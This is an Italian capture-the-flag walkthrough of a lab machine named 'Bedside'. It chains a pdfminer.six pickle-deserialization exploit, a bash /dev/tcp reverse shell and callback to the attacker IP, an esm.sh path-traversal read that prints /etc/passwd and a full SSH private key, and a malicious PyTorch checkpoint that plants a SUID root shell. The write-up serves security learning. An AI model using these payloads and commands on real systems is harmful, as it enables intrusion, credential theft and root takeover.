# Bedside

IP vittima: 10.129.248.191
IP attaccante: 10.10.15.73

## 1. Enumerazione iniziale

Scan delle porte:

```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.248.191 -oG porte
```

Risultati:

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Scan dei servizi:

```
sudo nmap -sC -sV -O -p22,80 10.129.248.191 -oN servizi
```

Risultati principali:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.68
|_http-server-header: Apache/2.4.68 (Debian)
|_http-title: Did not follow redirect to http://bedside.htb/
```

Il server HTTP redirige verso:

```
http://bedside.htb/
```

Aggiungiamo il dominio:

```
echo "10.129.248.191 bedside.htb" | sudo tee -a /etc/hosts
```
## 2. Enumerazione dei Virtual Host

Dopo aver identificato `bedside.htb`, effettuiamo un Virtual Host fuzzing per verificare se Apache espone altre applicazioni sullo stesso indirizzo IP:

```bash
ffuf \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
-u http://10.129.248.191/ \
-H "Host: FUZZ.bedside.htb" \
-ac
```

L'enumerazione individua:

```text
research [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 34ms]
```

Dopo aver individuato il Virtual Host:

```text
research.bedside.htb
```

Aggiungiamlo il nuovo hostname a `/etc/hosts`:

```bash
echo "10.129.248.191 research.bedside.htb" | sudo tee -a /etc/hosts
```

lo abbiamo aperto nel browser. Il browser mostrava:

```text
https://research.bedside.htb/login
```

con una pagina che sembrava essere il login di **OpenVAS/Greenbone**.

A quel punto, però, abbiamo verificato direttamente cosa fosse realmente esposto dal target.

Prima abbiamo controllato HTTPS:

```bash
curl -k -i https://research.bedside.htb/login
```

La connessione non riusciva:

```
curl: (7) Failed to connect to research.bedside.htb port 443 after 37 ms: Could not connect to server
```

Abbiamo quindi verificato la porta 443:

```bash
nmap -Pn -p443 10.129.248.191
```

ottenendo:

```text
PORT    STATE  SERVICE
443/tcp closed https
```

Questo dimostrava che sul target **non era effettivamente presente un servizio HTTPS sulla porta 443**.

La pagina OpenVAS vista nel browser non rappresentava quindi il servizio reale che stavamo cercando sul target.

A questo punto siamo tornati al Virtual Host usando esplicitamente **HTTP sulla porta 80**:

```bash
curl -i http://research.bedside.htb/
```

Questa volta la risposta era:

```text
HTTP/1.1 200 OK
```

e il contenuto HTML mostrava la vera applicazione associata al Virtual Host.

Nella risposta erano presenti due elementi fondamentali:

```text
X-Powered-By: pdfminer.six
```

e un form HTML per l'upload dei file.

In altre parole, il passaggio decisivo è stato non fidarsi semplicemente di ciò che il browser aveva aperto, ma verificare manualmente:

```text
HTTP  → porta 80 → applicazione reale
HTTPS → porta 443 → chiusa
```

Abbiamo quindi visitato nel browser `http://research.bedside.htb/` dove troviamo un form per l'upload di file.
Il form accetta diversi tipi di file:

```text
jpeg
jpg
png
bmp
tiff
dcm
pdf
```

Abbiamo enumerato il subdominio trovato:

```
ffuf -u http://research.bedside.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php,.txt,.json,.log,.bak -fc 404,403
```

trovando:

```
index.php               [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 28ms]
uploads                 [Status: 301, Size: 370, Words: 21, Lines: 10, Duration: 31ms]
javascript              [Status: 301, Size: 373, Words: 21, Lines: 10, Duration: 29ms]
.                       [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 27ms]
```

Possiamo verificarne il funzionamento caricando un PDF:

```bash
curl -F 'uploadFile=@test.pdf;type=application/pdf' \
http://research.bedside.htb/
```

È verosimile che i file caricati risultano poi accessibili dalla directory:

```text
/uploads/
```

ad esempio:

```bash
curl -I http://research.bedside.htb/uploads/test.pdf
```

Questa enumerazione ci fornisce quindi due informazioni fondamentali:

```text
research.bedside.htb
        │
        ├── File Upload
        │
        └── X-Powered-By: pdfminer.six
```

La combinazione tra upload controllato e utilizzo di `pdfminer.six` diventa il punto di partenza per il foothold.
## 4. CVE-2025-64512 – pdfminer.six Arbitrary Code Execution

`pdfminer.six` è una libreria Python utilizzata per analizzare la struttura interna dei file PDF ed estrarne contenuti come testo, font, metadati e informazioni di encoding.

Nel portale `research.bedside.htb` la presenza di questa libreria viene individuata osservando gli header HTTP restituiti dall'applicazione:

```text
X-Powered-By: pdfminer.six
```

Poiché il portale consente l'upload di file PDF e questi vengono elaborati automaticamente lato server, viene presa in considerazione una vulnerabilità nota di `pdfminer.six`:

```text
CVE-2025-64512
```

La vulnerabilità riguarda il modo in cui `pdfminer.six` gestisce determinati valori presenti nel campo `/Encoding` di un oggetto font PDF.

In un normale PDF, `/Encoding` serve a indicare come devono essere interpretati i caratteri utilizzati da un font. Nel comportamento vulnerabile, però, un valore appositamente costruito può essere interpretato come un pathname locale.

`pdfminer.six` utilizza quindi tale valore come base per cercare un file con estensione:

```text
.pickle.gz
```

Il file individuato viene decompresso e successivamente deserializzato utilizzando il modulo Python `pickle`.

Questo comportamento è pericoloso perché un oggetto Python serializzato può definire il metodo:

```python
__reduce__()
```

che consente di specificare una funzione da invocare durante la deserializzazione.

Di conseguenza, se controlliamo il contenuto del file `.pickle.gz`, possiamo ottenere esecuzione arbitraria di codice quando `pdfminer.six` lo carica. Chiamiamo il file `evil.pickle.gz`

La logica generale dell'attacco è:

```text
evil.pickle.gz
      │
      │ contiene un oggetto pickle con __reduce__()
      ▼
upload sul server
      │
      ▼
PDF malevolo
      │
      │ /Encoding contiene il pathname del file "evil"
      ▼
pdfminer.six processa il PDF
      │
      ▼
apre evil.pickle.gz
      │
      ▼
pickle deserialization
      │
      ▼
esecuzione del comando controllato
```

Dal punto di vista HTTP sappiamo già che il file è raggiungibile attraverso:

```text
http://research.bedside.htb/uploads/evil.pickle.gz
```

Questo, però, ci fornisce soltanto il **percorso web**:

```text
/uploads/evil.pickle.gz
```

Per sfruttare la vulnerabilità abbiamo invece bisogno del **percorso assoluto sul filesystem del server**, perché `pdfminer.six` deve aprire localmente il file `.pickle.gz`.

Il percorso web:

```text
/uploads/
```

non implica necessariamente che sul filesystem il file si trovi in:

```text
/var/www/.../uploads/
```

e, soprattutto, non permette di conoscere direttamente quale sia la DocumentRoot utilizzata dal Virtual Host.

Il file avrebbe potuto trovarsi, ad esempio, in uno qualsiasi di questi percorsi:

```text
/var/www/html/uploads/
/var/www/research/uploads/
/var/www/research.bedside.htb/uploads/
```

Per questo motivo il pathname corretto viene individuato sperimentalmente sfruttando la stessa vulnerabilità.
### POC CVE-2025-64512

Per sfruttare l'exploit utilizziamo questo POC: https://github.com/BardLaudian/CVE-2025-64512

Per trovare il percorso esatto apriamo sulla macchina attacker avviamo il listener HTTP:

```bash
python3 -m http.server 8000
```

poi utilizziamo questo comando del POC:

```
python3 gen_payload.py \
  --path "<PATH>/payload" \
  --command "curl http://10.10.15.73:8000/PATH" \
  --pdf-out trigger.pdf \
  --gz-out payload.pickle.gz
```

Questo comando genera il payload **payload.pickle.gz** e il pdf trigger **trigger.pdf**.

Carichiamo prima **payload.pickle.gz** e poi **trigger.pdf** attraverso la pagina `http://research.bedside.htb/`. Quando nel server python compare il messaggio:

```
10.129.248.191 - - [04/Oct/2026 14:09:59] code 404, message File not found
10.129.248.191 - - [04/Oct/2026 14:09:59] "GET /PATH3 HTTP/1.1" 404 -
```

Abbiamo trovato il percorso esatto che in questo caso è:

```
/var/www/research.bedside.htb/uploads/
```

Abbiamo quindi la conferma che `pdfminer.six` ha individuato il file nel pathname corretto, lo ha deserializzato e ha eseguito il comando controllato.

A questo punto il semplice callback HTTP può essere sostituito con una reverse shell.
### Reverse shell

Creiamo i file necessari con il comando:

```
python3 gen_payload.py \
  --path "/var/www/research.bedside.htb/uploads/shell" \
  --command "bash -c 'bash -i >& /dev/tcp/10.10.15.73/4444 0>&1'" \
  --pdf-out trigger.pdf \
  --gz-out shell.pickle.gz
```

Apriamo un listener con [[netcat]]:

```
nc -lvnp 4444
```

Poi, come prima, carichiamo prima **shell.pickle.gz** e poi **trigger.pdf**

Dopo qualche istante otteniamo la **shell**.
## 5. Docker container

Abbiamo ottenuto una shell come user **datawrangle** (`whoami`), inoltre nella relativa cartella **/home/datawrangler** non è presente alcuna user flag (`ls /home/datawrangler`), quindi è molto probabile che **datawragler** non sia lo user della macchina. Analizzando **/etc/passwd** (`cat /etc/passwd`) però pare non essere presente nessun altro user rilevante:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
```

È possibile quindi che si sia all'interno di un container [[docker]]

Verifichiamo la presenza del file:

```bash
ls -la /.dockerenv
```

che risulta esistente.

Il file:

```text
/.dockerenv
```

viene normalmente creato da Docker all'interno dei container ed è quindi una conferma molto forte che la shell `datawrangler` si trovi all'interno di un container Docker.

Controlliamo quindi i filesystem montati:

```bash
mount
```

Il filesystem root `/` risulta essere di tipo:

```text
overlay
```

Docker utilizza normalmente un filesystem OverlayFS/`overlay2` per costruire il filesystem dei container, quindi questo rappresenta un forte indicatore della presenza di Docker.

Nello stesso output vengono inoltre individuati alcuni mount specifici:

```text
/datastore
/etc/resolv.conf
/etc/hostname
/etc/hosts
/var/www/research.bedside.htb/uploads
```

Questi elementi risultano montati separatamente all'interno dell'ambiente, indicando che alcune risorse dell'host sono state rese disponibili al container tramite bind mount.

Ci troviamo quindi all'interno di un container [[docker]]
### Network namespace e servizi interni

Cerchiamo di scoprire le reti raggiungibili leggendo i file virtuali del kernel Linux direttamente da `/proc`.
La tabella di routing è sempre scritta nel file virtuale del kernel. Puoi leggerla con:

```
cat /proc/net/route
```

```
Iface	Destination	Gateway 	Flags	RefCnt	Use	Metric	Mask		MTU	Window	IRTT                                                       
eth0	00000000	0100810A	0003	0	0	0	00000000	0	0	0                                                                               
eth0	0000810A	00000000	0001	0	0	0	0000FFFF	0	0	0                                                                               
docker0	000011AC	00000000	0001	0	0	0	0000FFFF	0	0	0
```

Ecco l'analisi dettagliata di cosa significano queste tre righe:

1. La rete locale principale (`eth0`)

- **Dati:** `Destination: 0000810A` | `Mask: 0000FFFF`
- **Conversione:**
    - `0000810A` invertito diventa `0A.81.00.00`. In decimale: **`10.129.0.0`**
    - `0000FFFF` invertito diventa `FF.FF.00.00`. In decimale: **`255.255.0.0`** (ovvero una maschera **/16**)
- **Cosa significa:** Il container è direttamente connesso alla rete **`10.129.0.0/16`** tramite l'interfaccia `eth0`. Può raggiungere qualsiasi altro host o servizio all'interno di questa rete senza passare da un gateway.

2. La rete dei container Docker interni (`docker0`)

- **Dati:** `Destination: 000011AC` | `Mask: 0000FFFF`
- **Conversione:**
    - `000011AC` invertito diventa `AC.11.00.00`. In decimale: **`172.17.0.0`**
    - `0000FFFF` in decimale è sempre **/16** (`255.255.0.0`)
- **Cosa significa:** Il container (che probabilmente sta agendo a sua volta da host o ha privilegi particolari) vede l'interfaccia `docker0` sulla rete **`172.17.0.0/16`**. Può raggiungere gli altri container attestati su questa rete Docker standard.

3. La rotta predefinita verso l'esterno / Internet (`default gateway`)

- **Dati:** `Destination: 00000000` | `Gateway: 0100810A`
- **Conversione:**
    - `00000000` significa "qualunque altra destinazione" (Route di default).
    - `0100810A` invertito diventa `0A.81.00.01`. In decimale: **`10.129.0.1`**
- **Cosa significa:** Per raggiungere **qualsiasi altra rete nel mondo o su Internet** (es. il DNS `1.1.1.1` o un sito web), il container invierà i pacchetti al gateway **`10.129.0.1`** usando l'interfaccia `eth0`

Controlliamo gli IP assegnati con  `/proc/net/fib_trie`:

```
cat /proc/net/fib_trie | grep host -B 1
```

```
           |-- 10.129.80.186
              /32 host LOCAL
--
           |-- 127.0.0.0
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
--
           |-- 172.17.0.1
              /32 host LOCAL
--
           |-- 10.129.80.186
              /32 host LOCAL
--
           |-- 127.0.0.0
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
--
           |-- 172.17.0.1
              /32 host LOCAL
```

Questo output dal file `/proc/net/fib_trie` ci dice con precisione chirurgica **quali sono gli indirizzi IP assegnati direttamente al tuo container** (le interfacce locali).

In Linux, le voci marchiate come `/32 host LOCAL` indicano gli indirizzi IP che appartengono alla macchina stessa (in questo caso, al tuo container).

Ecco la mappa definitiva dei tuoi IP locali:

- **`10.129.80.186`**: Questo è l'**indirizzo IP principale del tuo container** sulla rete `eth0`. Come abbiamo visto prima, si trova all'interno della rete `10.129.0.0/16`, il che significa che puoi comunicare direttamente con tutti gli host che hanno un IP che inizia per `10.129.X.X`.
- **`172.17.0.1`**: Questo è l'IP associato all'interfaccia `docker0`. Poiché finisce con `.1`, indica che il tuo container sta facendo da **Gateway per la rete Docker interna** (`172.17.0.0/16`). Qualsiasi altro container collegato a quella specifica rete passerà da te per uscire.
- **`127.0.0.1`**: È il classico indirizzo di _loopback_
    
    (`localhost`), utilizzato dal container per parlare con i servizi che girano esclusivamente al suo interno.

Sintesi della tua raggiungibilità:

1. **Rete Locale (`eth0`):** Raggiungi direttamente la sottorete **`10.129.0.0/16`** (il tuo IP è `10.129.80.186`).
2. **Rete dei Container (`docker0`):** Raggiungi direttamente la sottorete **`172.17.0.0/16`** (tu sei l'IP `172.17.0.1`).
3. **Esterno / Internet:** Qualsiasi indirizzo IP al di fuori di queste due reti verrà instradato verso il gateway **`10.129.0.1`** (visto nel comando precedente).

`172.17.0.1` è particolarmente interessante perché corrisponde tipicamente al bridge Docker dell'host.

A questo punto effettuiamo un piccolo scan dei primi indirizzi della rete `172.17.0.1`, concentrandoci sulle porte più comuni per trovare delle porte aperte. Utilizziamo una funzionalità nativa di Bash per testare le porte senza usare alcun comando esterno. Eseguendo questo ciclo direttamente nel terminale per scansionare le prime 5000 porte:

```
for port in {1..5000}; do (echo > /dev/tcp/172.17.0.1/$port) >/dev/null 2>&1 && echo "Porta $port: APERTA"; done
```

Risultato:

```text
172.17.0.1:22 OPEN
172.17.0.1:80 OPEN
172.17.0.1:3000 OPEN
```

Le porte `22` e `80` corrispondono a servizi già noti.

La porta interessante è quindi:

```text
172.17.0.1:3000
```
### Analisi del servizio sulla porta 3000

Analiziamo il servizio con il comando:

```
curl -i http://172.17.0.1:3000/
```

La pagina restituita è:

```
Bedside Clinic - Image Viewer
```

Analizzando il codice HTML vengono individuati riferimenti a:

```
esm.sh/x
```

Infatti, alla fine dell'html ottenuto troviamo:

``` html
<script type="module">import createHotContext from"/@hmr";const hot=createHotContext("/index.html");hot.watch(()=>location.reload());</script><script>console.log("%c💚 Built with esm.sh/x, please uncheck \"Disable cache\" in Network tab for better DX!", "color:green")</script>datawrangler@data-wrangler:~$ 
```

Dal codice HTML restituito compare:

```
Built with esm.sh/x
```

Questo identifica direttamente il servizio come dev server `esm.sh/x`.

Inoltre l'header contiene ETag che terminano con **136**:

```
Etag: w/"1762804009713-3445-136"
```

Questo è un forte indizio che il server sia basato sulla release/build **136**.
## 6. CVE-2025-59341

La `CVE-2025-59341` interessa proprio `esm.sh` nelle versioni fino alla `136` e permette una **Local File Inclusion tramite path traversal** nella route `/pr/`.

La vulnerabilità permette una Local File Inclusion tramite path traversal nella route:

```
/pr/
```

Il payload richiede anche:

```
?raw=1&module=1
```

e `curl` deve essere eseguito con:

```
--path-as-is
```

per evitare la normalizzazione dei `../`.

Lettura di `/etc/passwd`:

```
curl --path-as-is -i 'http://172.17.0.1:3000/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&module=1'
```

Otteniamo:

```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1328    0  1328    0     0   498k      0 --:--:-- --:--:-- --:--:--  648k
HTTP/1.1 200 OK
Cache-Control: max-age=0, must-revalidate
Content-Type: application/octet-stream
Etag: w/"1780110289405-1328-136"
Date: Sun, 04 Oct 2026 15:32:19 GMT
Transfer-Encoding: chunked

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
_laurel:x:987:987::/var/log/laurel:/bin/false
polkitd:x:986:986:User for polkitd:/:/usr/sbin/nologin
```

Tra gli utenti troviamo:

```
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
```
## 7. User developer

Proviamo a leggere l'eventuale user flag di **developer**:

```
curl --path-as-is -i 'http://172.17.0.1:3000/pr/x/y@99/../../../../../../../../../../home/developer/user.txt?raw=1&module=1'
```

Otteniamo così la user flag.

Proviamo a controllare se è presente la chiave SSH privata di **developer**:

```
curl --path-as-is -i 'http://172.17.0.1:3000/pr/x/y@99/../../../../../../../../../../home/developer/.ssh/id_rsa?raw=1&module=1'
```

Ottenendo:

```
HTTP/1.1 200 OK
Cache-Control: max-age=0, must-revalidate
Content-Type: application/octet-stream
Etag: w/"1762737401212-411-136"
Date: Sun, 04 Oct 2026 15:42:25 GMT
Content-Length: 411

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

Viene restituita una chiave privata OpenSSH.

Salviamola localmente:

```
cat > developer.key <<'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
EOF
```

Concediamo i permessi:

```
chmod 600 developer.key
```

Accediamo allo user **developer** tramite SSH:

```
ssh -i developer.key developer@10.129.248.191
```

Accesso riuscito come:

```
developer
```

A questo punto in `/home/developer` si recupera la **user flag**.
## 8. Privilege Escalation
### ## Enumerazione sudo

Dopo aver ottenuto accesso SSH come utente `developer`, il primo controllo è:

```
sudo -l
```

Output:

```text
Matching Defaults entries for developer on bedside:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

Quindi `developer` può eseguire come root, senza password:

```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

Il punto di partenza della privilege escalation è quindi analizzare questo script.
### ## Analisi di `bedside_trainer.py`

Verifichiamo permessi e contenuto:

```bash
ls -l /opt/trainer/bedside_trainer.py
ls -ld /opt/trainer
```

Lo script appartiene a `root`:

```text
-rw-rw-r-- 1 root root ... /opt/trainer/bedside_trainer.py
drwxrwxr-x 2 root root ... /opt/trainer
```

Visualizziamo lo script:

```
cat /opt/trainer/bedside_trainer.py
```

Innanzi tutto lo script utilizza **MONAI** come si vede dagli import:

```
# MONAI imports
warnings.filterwarnings("ignore", category=FutureWarning)
from monai.data import Dataset, CacheDataset
from monai.transforms import (
    Compose, LoadImaged, EnsureChannelFirstd, ScaleIntensityd,
    RandSpatialCropd, ToTensord, EnsureTyped, ResizeWithPadOrCropd
)
from monai.handlers import CheckpointLoader  # <-- Correct import
```

MONAI è una libreria/framework open source per **AI e deep learning applicati all’imaging medico**.

Il nome significa **Medical Open Network for AI**. È costruita principalmente sopra PyTorch e fornisce componenti già pronti per lavorare con dati come:

- immagini radiologiche;
- TAC e risonanze magnetiche;
- immagini DICOM e NIfTI;
- segmentazione di organi o lesioni;
- classificazione di immagini mediche;
- training e validazione di modelli.

Nel nostro caso, `bedside_trainer.py` usa MONAI per preparare i dati e caricare eventuali checkpoint del modello. In particolare troviamo import come:

```
from monai.data import Dataset, CacheDataset
```

```
from monai.transforms import (    Compose,    LoadImaged,    EnsureChannelFirstd,    ScaleIntensityd,    RandSpatialCropd,    ToTensord,    EnsureTyped,    ResizeWithPadOrCropd)
```

e soprattutto:

```
from monai.handlers import CheckpointLoader
```

Questo componente serve a ripristinare lo stato di un training precedente caricando un checkpoint `.pt`.
### CVE-2025-58756

Troviamo la versione di MONAI installata:

```
python3 -m pip show monai
```

Ottenendo:

```
Name: monai
Version: 1.5.0
Summary: AI Toolkit for Healthcare Imaging
Home-page: https://monai.io/
Author: MONAI Consortium
Author-email: monai.contact@gmail.com
License: Apache License 2.0
Location: /usr/local/lib/python3.13/dist-packages
Requires: numpy, torch
Required-by:
```

Si tratta della versione **1.5.0** di **MONAI** che è vulnerabile alla **CVE-2025-58756** che riguarda l'uso insicuro di `torch.load()` durante il caricamento dei checkpoint, che può portare a esecuzione arbitraria di codice tramite deserializzazione malevola. 

Nel nostro caso `CheckpointLoader` esegue esplicitamente:

```
torch.load(self.load_path, map_location=self.map_location, weights_only=False)
```

Con `weights_only=False`, PyTorch usa il normale meccanismo di unpickling Python, che può eseguire codice arbitrario contenuto nel checkpoint. Poiché il trainer viene eseguito tramite `sudo`, il codice viene eseguito come **root**

Quindi MONAI, di per sé, non è “la vulnerabilità”: il problema nasce dal fatto che il trainer eseguito come root carica automaticamente un checkpoint controllabile usando una deserializzazione PyTorch non sicura.

Lo script cerca automaticamente il checkpoint `.pt` più recente:

```python
def find_latest_checkpoint(checkpoint_dir: Path):
    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
    return ckpts[-1] if ckpts else None
```

e successivamente lo carica tramite `MONAI CheckpointLoader`.

Nel `main()`:

```python
latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)

if latest_ckpt:
    loader = CheckpointLoader(
        load_path=str(latest_ckpt),
        load_dict={"model": model, "optimizer": optimizer},
        map_location=DEVICE
    )

    loader(engine)
```

Nello script è presente il datastore:

```
# --------------------------
# Datastore paths
# --------------------------
DATASTORE_ROOT = Path("/datastore")
CHECKPOINT_DIR = DATASTORE_ROOT / "checkpoints"
LOGS_DIR = DATASTORE_ROOT / "logs"
MODELS_DIR = DATASTORE_ROOT / "models"
PROCESSED_DIR = DATASTORE_ROOT / "processed"
RAW_DIR = DATASTORE_ROOT / "raw"
STAGING_DIR = DATASTORE_ROOT / "staging"
```

Quindi qualsiasi file `.pt` presente in:

```text
/datastore/checkpoints/
```

può essere automaticamente caricato quando il trainer viene avviato come root.

Come user **developer** controlliamo i permessi di `/datastore`:

```bash
ls -ld /datastore
```

Output:

```text
drwxrwx--- ... datawrangler dataops ... /datastore
```

**developer** non può quindi accedere a:

```text
/datastore/checkpoints
```

ma il precedente user **datawrangler**, ottenuto all'interno del container, se appartiene al gruppo:

```text
dataops
```

è in grado di scrivere nel datastore.
### Creazione del checkpoint malevolo

Come `developer` sull'host creiamo un checkpoint PyTorch.

Il payload copierà `/bin/bash` in:

```text
/usr/local/bin/rootbash
```

e imposterà il bit SUID:

```text
4755
```

Creazione:

```bash
python3 - <<'PY'
import torch
import os

class Pwn:
    def __reduce__(self):
        return (
            os.system,
            (
                "cp /bin/bash /usr/local/bin/rootbash && "
                "chmod 4755 /usr/local/bin/rootbash",
            )
        )

torch.save(Pwn(), "/tmp/evil.pt")
PYpy
```
### Trasferimento del checkpoint al container

Il file è stato creato sull'host nella `/tmp` di `developer`.

La shell `datawrangler` si trova invece nel container, quindi le due `/tmp` sono differenti.

Per trasferire il file utilizziamo un semplice server HTTP.

Come `developer`:

```bash
python3 -m http.server 8001 --bind 0.0.0.0 --directory /tmp
```

Il servizio viene quindi raggiunto dal container tramite l'indirizzo Docker bridge dell'host:

```text
172.17.0.1
```
### Copia del checkpoint in `/datastore/checkpoints`

Dalla shell `datawrangler`:

```bash
curl http://172.17.0.1:8001/evil.pt -o /tmp/evil.pt
```

Copiamo quindi il file nella directory utilizzata dal trainer:

```bash
cp /tmp/evil.pt /datastore/checkpoints/evil.pt
```
### Preparazione di un dataset valido

Il trainer carica il checkpoint solo **dopo** aver costruito il DataLoader e il modello.

La sequenza dello script è:

```python
dataloader, n_data = prepare_dataloader_from_processed(...)

model = build_model(dataloader).to(DEVICE)

latest_ckpt = find_latest_checkpoint(...)
```

Quindi deve essere presente almeno un file immagine valido in:

```text
/datastore/processed
```

prima che il codice raggiunga `CheckpointLoader`.

reiamo quindi un piccolo PNG valido:

```bash
base64 -d > /datastore/processed/test.png <<'EOF'
iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=
EOF
```

Lo script sceglie il checkpoint più recente in base al modification time, quindi aggiorniamo il timestamp:

```bash
touch /datastore/checkpoints/evil.pt
```
### Esecuzione del checkpoint come root

Torniamo nella sessione SSH di **developer**.

Lanciamo il comando consentito da sudo:

```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

Il trainer arriva a:

```text
Found checkpoint /datastore/checkpoints/evil.pt,
loading with CheckpointLoader...
```

MONAI esegue:

```python
torch.load(
    "/datastore/checkpoints/evil.pt",
    weights_only=False
)
```

che esegue come root:

```bash
cp /bin/bash /usr/local/bin/rootbash
chmod 4755 /usr/local/bin/rootbash
```

Il trainer può successivamente terminare con un errore perché il risultato di:

```python
os.system()
```

è un intero anziché un checkpoint PyTorch valido.

Questo non è rilevante: il comando è già stato eseguito durante la deserializzazione.
### Verifica della bash SUID

Come **developer**:

```bash
ls -l /usr/local/bin/rootbash
```

Output atteso:

```text
-rwsr-xr-x 1 root root ... /usr/local/bin/rootbash
```

La `s` nei permessi indica che il bit:

```text
SUID
```

è attivo.

Il file appartiene inoltre a:

```text
root:root
```
### Root shell

Eseguiamo Bash mantenendo i privilegi SUID:

```bash
/usr/local/bin/rootbash -p
```

Il parametro:

```text
-p
```

preserva l'effective UID privilegiato.

Verifica:

```bash
whoami
```

Output:

```text
root
```

Privilege escalation completata.

La root flag può essere letta con:

```bash
cat /root/root.txt
```

